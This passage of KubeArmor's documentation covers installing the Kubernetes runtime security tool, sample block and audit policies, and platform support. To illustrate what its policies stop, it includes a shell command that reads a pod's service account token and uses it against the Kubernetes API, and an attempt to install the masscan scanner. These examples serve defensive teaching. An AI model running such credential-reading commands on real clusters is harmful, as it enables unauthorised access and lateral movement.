# Kubearmor Documentation

Source: https://docs.kubearmor.io/llms-full.txt

---

# KubeArmor

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-e6d14fd78f87efa0b8803a3f6fdf04093d66d094%2Flogo.png?alt=media\&token=eda680df-7fab-4fd4-8788-6cddfd25b707)

[![Build Status](https://github.com/kubearmor/KubeArmor/actions/workflows/ci-test-ginkgo.yml/badge.svg)](https://github.com/kubearmor/KubeArmor/actions/workflows/ci-test-ginkgo.yml/) [![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/5401/badge)](https://bestpractices.coreinfrastructure.org/projects/5401) [![CLOMonitor](https://img.shields.io/endpoint?url=https://clomonitor.io/api/projects/cncf/kubearmor/badge)](https://clomonitor.io/projects/cncf/kubearmor) [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/kubearmor/kubearmor/badge)](https://securityscorecards.dev/viewer/?uri=github.com/kubearmor/KubeArmor) [![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fkubearmor%2FKubeArmor.svg?type=shield\&issueType=license)](https://app.fossa.com/projects/git%2Bgithub.com%2Fkubearmor%2FKubeArmor?ref=badge_shield) [![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fkubearmor%2FKubeArmor.svg?type=shield\&issueType=security)](https://app.fossa.com/projects/git%2Bgithub.com%2Fkubearmor%2FKubeArmor?ref=badge_shield) [![Slack](https://img.shields.io/badge/Join%20Our%20Community-Slack-blue)](https://cloud-native.slack.com/archives/C02R319HVL3) [![Discussions](https://img.shields.io/badge/Got%20Questions%3F-Chat-Violet)](https://github.com/kubearmor/KubeArmor/discussions) [![Docker Downloads](https://img.shields.io/docker/pulls/kubearmor/kubearmor)](https://hub.docker.com/r/kubearmor/kubearmor) [![ArtifactHub](https://img.shields.io/badge/ArtifactHub-KubeArmor-blue?logo=artifacthub\&labelColor=grey\&color=green)](https://artifacthub.io/packages/search?kind=19)

KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operations) of pods, containers, and nodes (VMs) at the system level.

KubeArmor leverages [Linux security modules (LSMs)](https://en.wikipedia.org/wiki/Linux_Security_Modules) such as [AppArmor](https://en.wikipedia.org/wiki/AppArmor), [SELinux](https://en.wikipedia.org/wiki/Security-Enhanced_Linux), or [BPF-LSM](https://docs.kernel.org/bpf/prog_lsm.html) to enforce the user-specified policies. KubeArmor generates rich alerts/telemetry events with container/pod/namespace identities by leveraging eBPF.

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <p><span data-gb-custom-inline data-tag="emoji" data-code="1f4aa">💪</span> <a href="use-cases/hardening_guide"><strong>Harden Infrastructure</strong></a></p><hr><p><span data-gb-custom-inline data-tag="emoji" data-code="26d3">⛓️</span> Protect critical paths such as cert bundles<br><span data-gb-custom-inline data-tag="emoji" data-code="1f4cb">📋</span> MITRE, STIGs, CIS based rules<br><span data-gb-custom-inline data-tag="emoji" data-code="1f6c5">🛅</span> Restrict access to raw DB table</p>          | <p><span data-gb-custom-inline data-tag="emoji" data-code="1f48d">💍</span> <a href="use-cases/least_permissive_access"><strong>Least Permissive Access</strong></a></p><hr><p><span data-gb-custom-inline data-tag="emoji" data-code="1f6a5">🚥</span> Process Whitelisting<br><span data-gb-custom-inline data-tag="emoji" data-code="1f6a5">🚥</span> Network Whitelisting<br><span data-gb-custom-inline data-tag="emoji" data-code="1f39b">🎛️</span> Control access to sensitive assets</p>                                       |
| <p><span data-gb-custom-inline data-tag="emoji" data-code="1f52d">🔭</span> <a href="use-cases/workload_visibility"><strong>Application Behavior</strong></a></p><hr><p><span data-gb-custom-inline data-tag="emoji" data-code="1f9ec">🧬</span> Process execs, File System accesses<br><span data-gb-custom-inline data-tag="emoji" data-code="1f9ed">🧭</span> Service binds, Ingress, Egress connections<br><span data-gb-custom-inline data-tag="emoji" data-code="1f52c">🔬</span> Sensitive system call profiling</p> | <p><span data-gb-custom-inline data-tag="emoji" data-code="2744">❄️</span> <a href="https://github.com/kubearmor/KubeArmor/blob/main/getting-started/deployment_models.md"><strong>Deployment Models</strong></a></p><hr><p><span data-gb-custom-inline data-tag="emoji" data-code="2638">☸️</span> Kubernetes Deployment<br><span data-gb-custom-inline data-tag="emoji" data-code="1f40b">🐋</span> Containerized Deployment<br><span data-gb-custom-inline data-tag="emoji" data-code="1f4bb">💻</span> VM/Bare-Metal Deployment</p> |

### Architecture Overview

![KubeArmor High Level Design](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-90da4830ad1a4916e7a413447a25e78ba3a7c18b%2Fkubearmor_overview.png?alt=media)

### Documentation :notebook:

* :point\_right: [Getting Started](https://docs.kubearmor.io/kubearmor/quick-links/deployment_guide)
* :dart: [Use Cases](https://docs.kubearmor.io/kubearmor/use-cases/hardening)
* :heavy\_check\_mark: [KubeArmor Support Matrix](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix)
* :chess\_pawn: [How is KubeArmor different?](https://docs.kubearmor.io/kubearmor/quick-links/differentiation)
* :scroll: Security Policy for Pods/Containers \[[Spec](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification)] \[[Examples](https://docs.kubearmor.io/kubearmor/documentation/security_policy_examples)]
* :scroll: Cluster level security Policy for Pods/Containers \[[Spec](https://docs.kubearmor.io/kubearmor/documentation/cluster_security_policy_specification)] \[[Examples](https://docs.kubearmor.io/kubearmor/documentation/cluster_security_policy_examples)]
* :scroll: Security Policy for Hosts/Nodes \[[Spec](https://docs.kubearmor.io/kubearmor/documentation/host_security_policy_specification)] \[[Examples](https://docs.kubearmor.io/kubearmor/documentation/host_security_policy_examples)]
* :scroll: Network Security Policy for Hosts/Nodes \[[Spec](https://docs.kubearmor.io/kubearmor/documentation/network_security_policy_specification)] \[[Examples](https://docs.kubearmor.io/kubearmor/documentation/network_security_policy_examples)]\
  ... [detailed documentation](https://docs.kubearmor.io/kubearmor/)

#### Contributors :busts\_in\_silhouette

* :blue\_book: [Contribution Guide](https://docs.kubearmor.io/kubearmor/contribution/contribution_guide)
* :technologist: [Development Guide](https://docs.kubearmor.io/kubearmor/contribution/development_guide), [Testing Guide](https://docs.kubearmor.io/kubearmor/contribution/testing_guide)
* :raised\_hand: [Join KubeArmor Slack](https://cloud-native.slack.com/archives/C02R319HVL3)
* :question: [FAQs](https://docs.kubearmor.io/kubearmor/documentation/faq)

#### Biweekly Meeting

* :speaking\_head: [Zoom Link](http://zoom.kubearmor.io)
* :page\_facing\_up: Minutes: [Document](https://docs.google.com/document/d/1IqIIG9Vz-PYpbUwrH0u99KYEM1mtnYe6BHrson4NqEs/edit)
* :calendar: Calendar invite: [Google Calendar](http://www.google.com/calendar/event?action=TEMPLATE\&dates=20220210T150000Z%2F20220210T153000Z\&text=KubeArmor%20Community%20Call\&location=\&details=%3Ca%20href%3D%22https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F1IqIIG9Vz-PYpbUwrH0u99KYEM1mtnYe6BHrson4NqEs%2Fedit%22%3EMinutes%20of%20Meeting%3C%2Fa%3E%0A%0A%3Ca%20href%3D%22%20http%3A%2F%2Fzoom.kubearmor.io%22%3EZoom%20Link%3C%2Fa%3E\&recur=RRULE:FREQ=WEEKLY;INTERVAL=2;BYDAY=TH\&ctz=Asia/Calcutta), [ICS file](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/resources/KubeArmorMeetup.ics)

### Notice/Credits :handshake:

* KubeArmor uses [Tracee](https://github.com/aquasecurity/tracee/)'s system call utility functions.

### CNCF

KubeArmor is [Sandbox Project](https://www.cncf.io/projects/kubearmor/) of the Cloud Native Computing Foundation. ![CNCF SandBox Project](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-4623d5e5b6d7d045cc7650c43a3701994357d19e%2Fcncf-sandbox.png?alt=media\&token=39d1b266-9f97-4c42-9ad8-bcb5b1abcdc8)

### ROADMAP

KubeArmor roadmap is tracked via [KubeArmor Projects](https://github.com/orgs/kubearmor/projects?query=is%3Aopen)

# Getting Started

This guide assumes you have access to a [k8s cluster](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix). If you want to try non-k8s mode, for instance systemd mode to protect/audit containers or processes on VMs/bare-metal, check [here](https://docs.kubearmor.io/kubearmor/quick-links/kubearmor_vm).

Check the [KubeArmor support matrix](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix) to verify if your platform is supported.

## Install KubeArmor

```
helm repo add kubearmor https://kubearmor.github.io/charts
helm repo update kubearmor
helm upgrade --install kubearmor-operator kubearmor/kubearmor-operator -n kubearmor --create-namespace
kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/pkg/KubeArmorOperator/config/samples/sample-config.yml
```

You can find more details about helm related values and configurations [here](https://github.com/kubearmor/KubeArmor/tree/main/deployments/helm/KubeArmorOperator).

## Install kArmor CLI (Optional)

```
curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin
# sudo access is needed to install it in /usr/local/bin directory. But, if you prefer not to use sudo, you can install it in a different directory which is in your PATH.
```

> \[!NOTE]\
> kArmor CLI provides a Developer Friendly way to interact with KubeArmor Telemetry. You can stream KubeArmor telemetry independently of kArmor CLI tool and integrate it with your chosen SIEM (Security Information and Event Management) solutions. [Here's a guide](https://github.com/kubearmor/kubearmor-relay-server/blob/main/README.md#streaming-kubearmor-telemetry-to-external-siem-tools) on how to achieve this integration. This guide assumes you have kArmor CLI to access KubeArmor Telemetry but you can view it on your SIEM tool once integrated.

## Deploy test nginx app

```
kubectl create deployment nginx --image=nginx
POD=$(kubectl get pod -l app=nginx -o name)
```

> \[!NOTE]`$POD` is used to refer to the target nginx pod in many cases below.

## Sample policies

<details>

<summary><strong>Deny execution of package management tools (apt/apt-get)</strong></summary>

Package management tools can be used in the runtime env to download new binaries that will increase the attack surface of the pods. Attackers use package management tools to download accessory tooling (such as `masscan`) to further their cause. It is better to block usage of package management tools in production environments.

Lets apply the policy to block such execution:

```
cat <<EOF | kubectl apply -f -
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-pkg-mgmt-tools-exec
spec:
  selector:
    matchLabels:
      app: nginx
  process:
    matchPaths:
    - path: /usr/bin/apt
    - path: /usr/bin/apt-get
  action:
    Block
EOF
```

Now execute the `apt` command to download the `masscan` tool.

```
kubectl exec -it $POD -- bash -c "apt update && apt install masscan"
```

It will be denied permission to execute.

```
sh: 1: apt: Permission denied
command terminated with exit code 126
```

If you don't see Permission denied please refer [here](https://docs.kubearmor.io/kubearmor/documentation/faq#debug-kubearmor-installation-issue-in-dockerized-kubernetes-environment) to debug this issue

</details>

<details>

<summary><strong>Get policy violations notifications using kArmor CLI</strong></summary>

```
karmor logs -n default --json
```

```json
{
  "Timestamp": 1686475183,
  "UpdatedTime": "2023-06-11T09:19:43.451704Z",
  "ClusterName": "default",
  "HostName": "ip-172-31-24-142",
  "NamespaceName": "default",
  "PodName": "nginx-8f458dc5b-fl42t",
  "Labels": "app=nginx",
  "ContainerID": "8762eafc25a35ab90089f79703b86659989e8e547c2c029fb60f55d884355000",
  "ContainerName": "nginx",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305",
  "HostPPID": 3341922,
  "HostPID": 3341928,
  "PPID": 786,
  "PID": 792,
  "ParentProcessName": "/bin/dash",
  "ProcessName": "/usr/bin/apt",
  "PolicyName": "block-pkg-mgmt-tools-exec",
  "Severity": "1",
  "Type": "MatchedPolicy",
  "Source": "/bin/dash",
  "Operation": "Process",
  "Resource": "/usr/bin/apt update",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "BPFLSM",
  "Action": "Block",
  "Result": "Permission denied"
}
```

</details>

<details>

<summary><strong>Deny access to service account token</strong></summary>

K8s mounts the service account token by default in each pod even if there is no app using it. Attackers use these service account tokens to do lateral movements.

For e.g., to access service account token:

```
❯ kubectl exec -it $POD -- bash
(inside pod) $ curl https://$KUBERNETES_PORT_443_TCP_ADDR/api --insecure --header "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)"
{                                
  "kind": "APIVersions",      
  "versions": [                 
    "v1"                      
  ],                          
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "ip-10-0-48-51.us-east-2.compute.internal:443"
    }
  ]
}
```

Thus we can see that one can use the service account token to access the Kube API server.

Lets apply a policy to block access to service account token:

```
cat <<EOF | kubectl apply -f -
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-service-access-token-access
spec:
  selector:
    matchLabels:
      app: nginx
  file:
    matchDirectories:
    - dir: /run/secrets/kubernetes.io/serviceaccount/
      recursive: true
  action:
    Block
EOF
```

Now when anyone tries to access to service account token, it would be `Permission Denied`.

```
❯ kubectl exec -it $POD -- bash
(inside pod) $ curl https://$KUBERNETES_PORT_443_TCP_ADDR/api --insecure --header "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)"
cat: /run/secrets/kubernetes.io/serviceaccount/token: Permission denied
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/api\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```

If you don't see Permission denied please refer [here](https://docs.kubearmor.io/kubearmor/documentation/faq#debug-kubearmor-installation) to debug this issue.

</details>

<details>

<summary><strong>Audit access to folders/paths</strong></summary>

Access to certain folders/paths might have to be audited for compliance/reporting reasons.

File Visibility is disabled by default to minimize telemetry. Some file based policies will need that enabled. To enable file visibility on a namespace level:

```
kubectl annotate ns default kubearmor-visibility="process,file,network" --overwrite
```

For more details on this: <https://docs.kubearmor.io/kubearmor/documentation/kubearmor\\_visibility#updating-namespace-visibility>

Lets audit access to `/etc/nginx/` folder within the deployment.

```
cat <<EOF | kubectl apply -f -
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: audit-etc-nginx-access
spec:
  selector:
    matchLabels:
      app: nginx
  file:
    matchDirectories:
    - dir: /etc/nginx/
      recursive: true  
  action:
    Audit
EOF
```

> Note: `karmor logs -n default` would show all the audit/block operations.

```json
{
  "Timestamp": 1686478371,
  "UpdatedTime": "2023-06-11T10:12:51.967519Z",
  "ClusterName": "default",
  "HostName": "ip-172-31-24-142",
  "NamespaceName": "default",
  "PodName": "nginx-8f458dc5b-fl42t",
  "Labels": "app=nginx",
  "ContainerID": "8762eafc25a35ab90089f79703b86659989e8e547c2c029fb60f55d884355000",
  "ContainerName": "nginx",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305",
  "HostPPID": 3224933,
  "HostPID": 3371357,
  "PPID": 3224933,
  "PID": 825,
  "ParentProcessName": "/x86_64-bottlerocket-linux-gnu/sys-root/usr/bin/containerd-shim-runc-v2",
  "ProcessName": "/bin/cat",
  "PolicyName": "audit-etc-nginx-access",
  "Severity": "1",
  "Type": "MatchedPolicy",
  "Source": "/bin/cat /etc/nginx/conf.d/default.conf",
  "Operation": "File",
  "Resource": "/etc/nginx/conf.d/default.conf",
  "Data": "syscall=SYS_OPENAT fd=-100 flags=O_RDONLY",
  "Enforcer": "eBPF Monitor",
  "Action": "Audit",
  "Result": "Passed"
}
```

</details>

<details>

<summary><strong>Zero Trust Least Permissive Policy: Allow only nginx to execute in the pod, deny rest</strong></summary>

Least permissive policies require one to allow certain actions/operations and deny rest. With KubeArmor it is possible to specify as part of the policy as to what actions should be allowed and deny/audit the rest.

[Security Posture](https://docs.kubearmor.io/kubearmor/documentation/default_posture) defines what happens to the operations that are not in the allowed list. Should it be audited (allow but alert), or denied (block and alert)?

By default the security posture is set to audit. Lets change the security posture to default deny.

```
kubectl annotate ns default kubearmor-file-posture=block --overwrite
```

```
cat <<EOF | kubectl apply -f -
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: only-allow-nginx-exec
spec:
  selector:
    matchLabels:
      app: nginx
  file:
    matchDirectories:
    - dir: /
      recursive: true  
  process:
    matchPaths:
    - path: /usr/sbin/nginx
    - path: /bin/bash
  action:
    Allow
EOF
```

Observe that the policy contains `Allow` action. Once there is any KubeArmor policy having `Allow` action then the pods enter least permissive mode, allowing only explicitly allowed operations.

> Note: Use `kubectl port-forward $POD --address 0.0.0.0 8080:80` to access nginx and you can see that the nginx web access still works normally.

Lets try to execute some other processes:

```
kubectl exec -it $POD -- bash -c "chroot"
```

Any binary other than `bash` and `nginx` would be permission denied.

If you don't see Permission denied please refer [here](https://docs.kubearmor.io/kubearmor/documentation/faq#debug-kubearmor-installation) to debug this issue

</details>

# Support Matrix

KubeArmor supports following types of workloads:

1. **K8s orchestrated**: Workloads deployed as k8s orchestrated containers. In this case, Kubearmor is deployed as a [k8s daemonset](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/). Note, KubeArmor supports policy enforcement on both k8s-pods ([KubeArmorPolicy](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification)) as well as k8s-nodes ([KubeArmorHostPolicy](https://docs.kubearmor.io/kubearmor/documentation/host_security_policy_specification)).
2. **Containerized**: Workloads that are containerized but not k8s orchestrated are supported. KubeArmor installed in [systemd mode](https://docs.kubearmor.io/kubearmor/quick-links/kubearmor_vm) can be used to protect such workloads.
3. **VM/Bare-Metals**: Workloads deployed on Virtual Machines or Bare Metal i.e. workloads directly operating as host/system processes. In this case, Kubearmor is deployed in [systemd mode](https://docs.kubearmor.io/kubearmor/quick-links/kubearmor_vm).

## Kubernetes Support Matrix

|    Provider   |                                          K8s engine                                          |                                          OS Image                                          |     Arch     | [Observability](https://docs.kubearmor.io/kubearmor/use-cases/workload_visibility) |      Audit Rules     |    Blocking Rules    | [Network-Segmentation](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/network_segmentation.md) |                              LSM Enforcer                             |                                               Remarks                                               |
| :-----------: | :------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------------: | :----------: | :--------------------------------------------------------------------------------: | :------------------: | :------------------: | :--------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------: |
|     Onprem    | kubeadm, [k0s](https://k0sproject.io), [k3s](https://www.rancher.com/products/k3s), microk8s |                          [Distros](#supported-linux-distributions)                         | x86\_64, ARM |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |                                                                                                     |
|     Google    |                       [GKE](https://cloud.google.com/kubernetes-engine)                      | [COS](https://cloud.google.com/container-optimized-os/docs/concepts/features-and-benefits) |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |  All [release channels](https://cloud.google.com/kubernetes-engine/docs/concepts/release-channels)  |
|     Google    |                       [GKE](https://cloud.google.com/kubernetes-engine)                      |                                       Ubuntu >= 16.04                                      |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |  All [release channels](https://cloud.google.com/kubernetes-engine/docs/concepts/release-channels)  |
|   Microsoft   |                              [AKS](https://azure.microsoft.com/)                             |                                       Ubuntu >= 18.04                                      |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |                                                                                                     |
|     Oracle    |         [OKE](https://www.oracle.com/cloud/cloud-native/container-engine-kubernetes/)        |                [UEK](https://docs.oracle.com/en/operating-systems/uek/) >=7                |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      | [Oracle Linux Server 8.7](https://docs.oracle.com/en/operating-systems/oracle-linux/8/relnotes8.7/) |
|      IBM      |                      [IKS](https://www.ibm.com/cloud/kubernetes-service)                     |                                           Ubuntu                                           |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |                                                                                                     |
|     Talos     |           [Talos k8s](https://www.siderolabs.com/platform/talos-os-for-kubernetes/)          |                                            Talos                                           |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                      [1540](https://github.com/kubearmor/KubeArmor/issues/1540)                     |
|      AWS      |                              [EKS](https://aws.amazon.com/eks/)                              |                                Amazon Linux 2 (kernel >=5.8)                               |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                                                                                                     |
|      AWS      |                              [EKS](https://aws.amazon.com/eks/)                              |                                           Ubuntu                                           |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |                                AppArmor                               |                                                                                                     |
|      AWS      |                              [EKS](https://aws.amazon.com/eks/)                              |       [Bottlerocket](https://github.com/bottlerocket-os/bottlerocket#bottlerocket-os)      |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                                                                                                     |
|      AWS      |                    [EKS-Auto-Mode](https://aws.amazon.com/eks/auto-mode/)                    |       [Bottlerocket](https://github.com/bottlerocket-os/bottlerocket#bottlerocket-os)      |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                                                                                                     |
|      AWS      |                       [Graviton](https://aws.amazon.com/ec2/graviton/)                       |                                           Ubuntu                                           |      ARM     |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |                                AppArmor                               |                                                                                                     |
|      AWS      |                       [Graviton](https://aws.amazon.com/ec2/graviton/)                       |                                       Amazon Linux 2                                       |      ARM     |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: |          :x:         |                                               :heavy\_check\_mark:                                               |                                SELinux                                |                                                                                                     |
|     RedHat    |         [OpenShift](https://www.redhat.com/en/technologies/cloud-computing/openshift)        |    [RHEL](https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux) <=8.4   |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: |          :x:         |                                               :heavy\_check\_mark:                                               |                                SELinux                                |                                                                                                     |
|     RedHat    |         [OpenShift](https://www.redhat.com/en/technologies/cloud-computing/openshift)        |    [RHEL](https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux) >=8.5   |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                                                                                                     |
|     RedHat    |                             [MicroShift](https://microshift.io/)                             |    [RHEL](https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux) >=9.2   |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                                                                                                     |
|    Rancher    |                        [RKE](https://rancher.com/docs/rke/latest/en/)                        |                                [SUSE](https://www.suse.com/)                               |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |                                                                                                     |
|    Rancher    |                          [K3S](https://www.rancher.com/products/k3s)                         |                          [Distros](#supported-linux-distributions)                         |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               | [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484), AppArmor |                                                                                                     |
|     Oracle    |                    [Ampere](https://www.oracle.com/in/cloud/compute/arm/)                    |                  [UEK](https://docs.oracle.com/en/operating-systems/uek/)                  |      ARM     |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: |          :x:         |                                               :heavy\_check\_mark:                                               |                                SELinux                                |                      [1084](https://github.com/kubearmor/KubeArmor/issues/1084)                     |
|     VMware    |                       [Tanzu](https://tanzu.vmware.com/kubernetes-grid)                      |                                             TBD                                            |    x86\_64   |                                   :construction:                                   |    :construction:    |    :construction:    |                                                  :construction:                                                  |                             :construction:                            |                      [1064](https://github.com/kubearmor/KubeArmor/issues/1064)                     |
|    Mirantis   |             [MKE](https://www.mirantis.com/software/mirantis-kubernetes-engine/)             |                                        Ubuntu>=20.04                                       |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |                                AppArmor                               |                      [1181](https://github.com/kubearmor/KubeArmor/issues/1181)                     |
| Digital Ocean |                   [DOKS](https://www.digitalocean.com/products/kubernetes/)                  |                               Debian GNU/Linux 11 (bullseye)                               |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                      [1120](https://github.com/kubearmor/KubeArmor/issues/1120)                     |
| Alibaba Cloud |                           [Alibaba](https://www.alibabacloud.com/)                           |                               Alibaba Cloud Linux 3.2104 LTS                               |    x86\_64   |                                :heavy\_check\_mark:                                | :heavy\_check\_mark: | :heavy\_check\_mark: |                                               :heavy\_check\_mark:                                               |      [BPFLSM](https://github.com/kubearmor/KubeArmor/issues/484)      |                      [1650](https://github.com/kubearmor/KubeArmor/issues/1650)                     |

## Supported Linux Distributions

Following distributions are tested for VM/Bare-metal based installations:

| Provider          | Distro                                                                                                    | VM / Bare-metal | Kubernetes |
| ----------------- | --------------------------------------------------------------------------------------------------------- | --------------- | ---------- |
| SUSE              | SUSE Enterprise 15                                                                                        | Full            | Full       |
| Debian            | [Buster](https://www.debian.org/releases/buster/) / [Bullseye](https://www.debian.org/releases/bullseye/) | Full            | Full       |
| Ubuntu            | 18.04 / 16.04 / 20.04                                                                                     | Full            | Full       |
| RedHat / CentOS   | RHEL / CentOS <= 8.4                                                                                      | Full            | Partial    |
| RedHat / CentOS   | RHEL / CentOS >= 8.5                                                                                      | Full            | Full       |
| Fedora            | Fedora 34 / 35                                                                                            | Full            | Full       |
| Rocky Linux       | Rocky Linux >= 8.5                                                                                        | Full            | Full       |
| AWS               | Amazon Linux 2022                                                                                         | Full            | Full       |
| AWS               | Amazon Linux 2023                                                                                         | Full            | Full       |
| RaspberryPi (ARM) | Debian                                                                                                    | Full            | Full       |
| ArchLinux         | ArchLinux-6.2.1                                                                                           | Full            | Full       |
| Alibaba           | Alibaba Cloud Linux 3.2104 LTS 64 bit                                                                     | Full            | Full       |

> **Note**\
> Full: Supports both enforcement and observability\
> Partial: Supports only observability

### Platform I am interested is not listed here! What can I do?

Please approach the Kubearmor community on [slack](https://cloud-native.slack.com/archives/C07EF44HWQM) or [raise](https://github.com/kubearmor/KubeArmor/issues/new/choose) a GitHub issue to express interest in adding the support.

It would be very much appreciated if you can test kubearmor on a platform not listed above and if you have access to. Once tested you can update this document and raise a PR.

# Differentiation

![KubeArmor Differentiation](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-c3e30cca3b3c624b0ba5dfdb316d44c8b6b37afe%2Fdifferentiation.png?alt=media\&token=659b58da-da79-4982-99d2-65817623aae1)

## Significance of Inline Mitigation

KubeArmor supports attack prevention, not just observability and monitoring.\
More importantly, the prevention is handled inline: even before a process is spawned, a rule can deny execution of a process.\
Most other systems typically employ "post-attack mitigation" that kills a process/pod after malicious intent is observed, allowing an attacker to execute code on the target environment.\
Essentially KubeArmor uses inline mitigation to reduce the attack surface of a pod/container/VM.\
KubeArmor leverages best of breed Linux Security Modules (LSMs) such as AppArmor, BPF-LSM, and SELinux (only for host protection) for inline mitigation.\
LSMs have several advantages over other techniques:

